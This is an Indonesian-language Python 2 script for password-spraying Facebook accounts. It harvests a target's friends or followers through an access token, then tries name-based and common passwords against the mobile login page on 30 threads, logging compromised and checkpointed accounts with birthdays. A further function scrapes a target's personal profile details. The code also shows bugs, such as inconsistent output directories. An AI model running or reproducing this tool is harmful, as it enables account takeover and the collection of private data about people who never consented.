#!/usr/bin/python2
# coding=utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime

b='\033[1;94m'
i='\033[1;92m'
c='\033[1;96m'
m='\033[1;91m'
u='\033[1;95m'
k='\033[1;93m'
p='\033[1;97m'
h='\033[1;92m'

A = '\x1b[1;90m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text
uas = random.choice([
 'Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11',
 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
 'Mozilla/5.0 (Linux; Android 5.0.2; SM-G530H Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36',
 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE72-1/031.023; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.3.1',
 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
 'Mozilla/5.0 (Linux; U; Android 9; zh-CN; PCT-AL10 Build/HUAWEIPCT-AL10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.2.5.1005 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; U; Android 4.4.2; pt-BR; X27 plus Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X; vi) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/19A5340a UCBrowser/11.3.5.1203 Mobile',
 'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaC5-00.2/101.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.35 Mobile Safari/533.4 3gpp-gba'
 ])
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'November',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))

def Xenzi(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def Me():
      os.system("clear")
      print("""
\x1b[1;97m    __  _______  ______
\x1b[1;97m   /  |/  / __ )/ ____/ |\x1b[1;96m® \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;90mXenzi Ganz
\x1b[1;97m  / /|_/ / __  / /_     |\x1b[1;96m® \x1b[1;97mYoutube \x1b[1;91m: \x1b[1;92mXENZI GANZ
\x1b[1;97m / /  / / /_/ / __/     |\x1b[1;96m® \x1b[1;97mGithub  \x1b[1;91m: \x1b[1;97m/Aldi098
\x1b[1;97m/_/  /_/_____/_/        |\x1b[1;96m® \x1b[1;97mVersion \x1b[1;91m: \x1b[1;90m1.0
                       """)


def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		Me()
                Xenzi('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] Di Sarankan Menggunakan Akun \x1b[1;92mTumbal\x1b[1;90m/\x1b[1;92mBaru')
		token = raw_input('\n\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Token \x1b[1;91m:\x1b[1;92m ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
                        menu()
		except KeyError:
			print("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Token Invalid!")
			sys.exit()
            
    
def menu():
    global token
    os.system('clear')
    try:
        r = requests.get('https://pastebin.com/raw/AeUZNK3c')
        db = json.loads(r.text)['database']
        Server = db['server']
        versi = db['version']
        status = db['status']
#        user = db['user premium']
    except (KeyError,IOError):
        os.system('clear')
        Me()
        print('[!] Database error, Please try again later!')
        sys.exit()
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Tidak Ada Koneksi!'
        sys.exit()

    Me()
    print("\x1b[0;97m[\x1b[0;92m•\x1b[0;97m] Username \x1b[0;91m: "+H+nama)
    print("\x1b[0;97m[\x1b[0;92m•\x1b[0;97m] Server   \x1b[0;91m: "+A+Server)
    print("\x1b[0;97m[\x1b[0;92m•\x1b[0;97m] Status   \x1b[0;91m: "+H+status)
    print("\x1b[0;97m[\x1b[0;92m•\x1b[0;97m] IP       \x1b[0;91m: "+A+ip)
    print("")
    Xenzi("\x1b[0;97m[\x1b[0;92m1\x1b[0;97m] Crack Dari Publik Teman \x1b[0;97m[\x1b[1;92mPro\x1b[0;97m]")
    Xenzi("\x1b[0;97m[\x1b[0;92m2\x1b[0;97m] Crack Dari Total Followers \x1b[0;97m[\x1b[1;92mPro\x1b[0;97m]")
#    Xenzi("\x1b[0;97m[\x1b[0;92m3\x1b[0;97m] Crack Dari Like Postingan \x1b[0;97m[\x1b[1;92mPro\x1b[0;97m]")
    Xenzi("\x1b[0;97m[\x1b[0;92m3\x1b[0;97m] Retrieve \x1b[1;91mTarget Data \x1b[0;97m[\x1b[1;92mPro\x1b[0;97m]")
#    print("[5] Dump ID Dari Teman [Pro]")
#    print("[6] Dump ID Dari Publik [pro]")
#    print("[7] Dump ID Daro Total followers [Pro]")
#    print("[8] Mulai Crack [File] [Pro]")
    Xenzi("\x1b[0;97m[\x1b[0;92m4\x1b[0;97m] Lihat Hasil Crack \x1b[1;97m[\x1b[1;92mPro\x1b[1;97m]")
    Xenzi("\x1b[0;97m[\x1b[0;91m0\x1b[0;97m] Keluar \x1b[1;90m( \x1b[1;91mHapus Token \x1b[1;90m)")
    pilih_menumbasic()


def pilih_menumbasic():
    ask = raw_input('\n\x1b[1;97m[\x1b[1;92m•\x1b[1;97m] Pilih \x1b[1;91m:\x1b[1;92m ')
    print""
    if ask == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Pilih Yang Benar!'
        time.sleep(2)
        menu()
    elif ask == '01' or ask == '1':
        bot = 'https://pastebin.com/raw/Wi0uFK8d'
        status = requests.get(bot).text
        if  status == 'offline' or status =='Offline':
             Xenzi("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Maaf Server Sedang Offline!")
             exit()
        else:
             print("\x1b[1;97m[\x1b[1;93m•\x1b[1;97m] Isi \x1b[1;92m'me' \x1b[1;97mJika Ingin Crack Dari Daftar Teman")
        idt = raw_input('\x1b[1;97m[\x1b[1;93m•\x1b[1;97m] Masukan ID Target \x1b[1;97m:\x1b[1;92m ')
        print ""
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[+] Nama : ' + sp['name']
        except KeyError:
            print '[!] ID Tidak Tersedia!'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        print '[+] Total ID : ' + str(len(id))

    elif ask == '02' or ask == '2':
        bot = 'https://pastebin.com/raw/Wi0uFK8d'
        status = requests.get(bot).text
        if  status == 'offline' or status =='Offline':
             Xenzi("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Maaf Server Sedang Offline!")
             exit()
        else:
             print("\x1b[1;97m[\x1b[1;93m•\x1b[1;97m] Isi \x1b[1;92m'me' \x1b[1;97mJika Ingin Crack Dari Daftar Teman")
        idt = raw_input('\x1b[1;97m[\x1b[1;93m•\x1b[1;97m] Masukan ID Target \x1b[1;97m:\x1b[1;92m ')
        print ""
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[+] Nama : ' + sp['name']
        except KeyError:
            print '[!] ID Tidak Tersedia!'
            exit()

        r = requests.get('https://graph.facebook.com/'+idt+'/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        print '[+] Total ID : ' + str(len(id))

    elif ask == '03' or ask == '3':
        bot = 'https://pastebin.com/raw/Wi0uFK8d'
        status = requests.get(bot).text
        if  status == 'offline' or status =='Offline':
             Xenzi("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Maaf Server Sedang Offline!")
             exit()
        else:
             print ("\x1b[1;97m[\x1b[1;93m•\x1b[1;97m] Masukan Id Target")
        date_target()
    elif ask == '04' or ask == '4':
        print'\n[1] Hasil Crack OK '
        print'[2] Hasil Crack CP '
        ress = raw_input('\n[?] Pilih : ')
        if ress == '':
            menu()
        elif ress == '01' or ress == '1':
            try:
               totalok = open('Hasil/OK-%s-%s-%s.txt' % (ha, op, ta)).read().splitlines()
               print '[•] Hasil OK Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
               print("%s"%(H))
               os.system('  cat Hasil/OK-%s-%s-%s.txt' % (ha, op, ta))
               print ("\n")
               print '[•] Total OK : %s' %(len(totalcp))
               exit()
            except:
               print("\n[!] File Tidak Ada")
               exit()

        elif ress == '02' or ress == '2':
            try:
               totalcp = open('Hasil/CP-%s-%s-%s.txt' % (ha, op, ta)).read().splitlines()
               print '\n[•] Hasil CP Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
               print("%s"%(K))
               os.system('  cat Hasil/CP-%s-%s-%s.txt' % (ha, op, ta))
               print("\n")
               print '[•] Total CP : %s' %(len(totalcp))
               exit()
            except:
               print("\n[!] File Tidak Ada")
               exit()
        else:
            print('[!] Pilih Yang Benar!')
            menu()
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        Xenzi("[✓] Berhasil Menghapus Token √√")
        exit()
    else:
        print'[!] Pilih Yang Benar!'
        menu()
    ask = raw_input('[?] Apakah Anda Ingin Membuat Password Manual? Y/t: ')
    if ask == 'Y' or ask == 'y':
        manualmbasic()

    print '\n[•] Hasil OK Disimpan Di : Hasil/OK-%s-%s-%s.txt' % (ha, op, ta)
    print "[•] Hasil CP Disimpan Di : Hasil/CP-%s-%s-%s.txt" % (ha, op, ta)
    print("\n[!] untuk berhenti tekan CTRL lalu tekan Z")
    print("")

    def main(arg):
        global loop
        print'\r[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('Hasil')
        except OSError:
            pass

        try:
            for pw in [
                 name.lower(),
                 name.lower() + '123',
                 name.lower() + '1234',
                 name.lower() + '12345',
                 name.lower() + '12346',
                 name.lower() + '1234567',
                 name.lower() + '12345678',
                 name.lower() + '123456789',
                 name.lower() + 'nih Bos',
                 'anjing',
                 'bangsat',
                 'sayang',
                 'Doraemon',
                 'Naruto123',
                 'anjing123',
                 'bangsat1234',
                 'sayang123',
                 'Doraemon123',
                 'Naruto1234',
                 'wibu12345']:
                rex = requests.get('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;97m[\x1b[0;92mOK\x1b[0;97m]\x1b[0;97m '+ uid +' | ' + pw + '                                            '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  [OK] ' + str(uid) + ' | ' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        ttl = b['birthday']
                        print'\r\x1b[0;97m[\x1b[0;93mCP\x1b[0;97m]\x1b[0;97m '+ uid +' | '+ pw +' | \x1b[1;90m'+ ttl + '                       '
                        cp.append(uid + ' | ' + pw + ' | ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [CP] ' + str(uid) + ' | ' + str(pw) + ' | ' + str(ttl) +                       '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        ttl = " "
                    except:pass
                    print '\r\x1b[0;97m[\x1b[0;93mCP\x1b[0;97m] \x1b[0;97m'+ uid +' | '+ pw +'                       '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  [CP] ' + str(uid) + ' | ' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n\x1b[0;97m[\x1b[0;92m✓\x1b[0;97m]\x1b[1;97m Done \x1b[0;93m>_<'
    exit()

def date_target():
    try:
       token = open('login.txt','r').read()
    except (KeyError,IOError):
       print('')
       tokenz()
    idt = raw_input("[•] Masukan ID Target : ")
    try:
        zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);ganz = json.loads(zx.text)
    except (KeyError,IOError):print('[!] ID Not Found!');menu()
    try:nm = ganz["name"]
    except (KeyError,IOError):nm = ("-")
    try:nd = ganz["first_name"]
    except (KeyError,IOError):nd = ("-")
    try:nt = ganz["middle_name"]
    except (KeyError,IOError):nt = ("-")
    try:nb = ganz["last_name"]
    except (KeyError,IOError):nb = ("-")
    try:ut = ganz["birthday"]
    except (KeyError,IOError):ut = ("-")
    try:gd = ganz["gender"]
    except (KeyError,IOError):gd = ("-")
    try:em = ganz["email"]
    except (KeyError,IOError):em = ("-")
    try:lk = ganz["link"]
    except (KeyError,IOError):lk = ("-")
    try:us = ganz["username"]
    except (KeyError,IOError):us = ("-")
    try:rg = ganz["religion"]
    except (KeyError,IOError):rg = ("-")
    try:rl = ganz["relationship_status"]
    except (KeyError,IOError):rl = ("-")
    try:rls = ganz["significant_other"]["name"]
    except (KeyError,IOError):rls = ("-")
    try:lc = ganz["location"]["name"]
    except (KeyError,IOError):lc = ("-")
    try:ht = ganz["hometown"]["name"]
    except (KeyError,IOError):ht = ("-")
    try:ab = ganz["about"]
    except (KeyError,IOError):ab = ("-")
    try:lo = ganz["locale"]
    except (KeyError,IOError):lo = ("-")
    Xenzi("\n[!] Proses ...")
    time.sleep(3)
    Xenzi('\n[•] Name : %s'%(nm))
    Xenzi('[•] First name : %s'%(nd))
    Xenzi('[•] Middle name : %s'%(nt))
    Xenzi('[•] Last name : %s'%(nb))
    Xenzi('[•] TTL : %s'%(ut))
    Xenzi('[•] Gender : %s'%(gd))
    Xenzi('[•] Email : %s'%(em))
    Xenzi('[•] Link : %s'%(lk))
    Xenzi('[•] Username : %s'%(us))
    Xenzi('[•] Religion : %s'%(rg))
    Xenzi('[•] Relationship status : %s'%(rl))
    Xenzi('[•] Relationship With : %s'%(rls))
    Xenzi('[•] Residence : %s'%(lc))
    Xenzi('[•] Place  Origin : %s'%(ht))
    Xenzi('[•] About : %s'%(ab))
    Xenzi('[•] Local : %s'%(lo))
    raw_input('\n[?] Enter Untuk Kembali')
    menu()

def manualmbasic():
    print '\n[•] Buat Password Contoh : bismillah,sayang,rahasia'
    pw = raw_input('[?] Buat Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    print '\n[•] Hasil OK Disimpan Di : Hasil/OK-%s-%s-%s.txt' % (ha, op, ta)
    print '[•] Hasil CP Disimpan Di : Hasil/CP-%s-%s-%s.txt' % (ha, op, ta)
    print("\n[!] untuk berhenti tekan CTRL lalu tekan Z ")
    print("")

    def main(arg):
        global loop
        print'\r[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('Hasil')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;97m[\x1b[0;92mOK\x1b[0;97m]\x1b[1;97m '+ uid +' | ' + pw +' '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  [OK] ' + str(uid) + ' | ' + str(asu) +                         '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        ttl = b['birthday']
                        print '\r\x1b[0;97m[\x1b[0;93mCP\x1b[0;97m]\x1b[0;97m '+ uid +' | '+ pw +' | \x1b[1;90m'+ ttl + '                       '
                        cp.append(uid + ' | ' + asu + ' | ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write('[CP] ' + str(uid) + ' | ' + str(asu) + ' | ' + str(ttl) +                        '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        ttl = " "
                    except:pass
                    print '\r\x1b[0;97m[\x1b[0;93mCP\x1b[0;97m]\x1b[0;97m '+ uid +' | '+ pw +' | \x1b[1;90m'+ ttl + '                       '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + ' | ' + str(asu) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[0;97m[\x1b[0;92m✓\x1b[0;97m]\x1b[1;97m Done \x1b[0;93m>_<'
    exit()
    

    
if __name__ == '__main__':
    os.system('clear')
    Me()
    tokenz()


